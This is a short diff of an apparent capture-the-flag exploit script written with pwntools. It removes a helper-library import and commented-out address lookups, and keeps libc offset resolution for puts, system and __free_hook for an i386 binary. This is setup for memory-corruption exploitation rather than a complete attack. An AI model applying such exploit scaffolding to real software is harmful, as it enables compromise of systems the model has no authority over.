@@ -1,11 +1,6 @@
 from pwn import *
 import sys
 
-#import kmpwn
-sys.path.append('/home/vagrant/kmpwn')
-from kmpwn import *
-#fsb(width, offset, data, padding, roop)
-
 #config
 context(os='linux', arch='i386')
 context.log_level = 'debug'
@@ -27,11 +22,6 @@ libc = ELF('./libc.so')
 off_puts = libc.symbols["puts"]
 off_system = libc.symbols["system"]
 off_free_hook = libc.symbols["__free_hook"]
-#
-#main_addr = elf.symbols["main"]
-#libc_binsh = next(elf.search("/bin/sh"))
-#addr_bss = elf.bss()
-#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
 
 l = 1
 d = 2
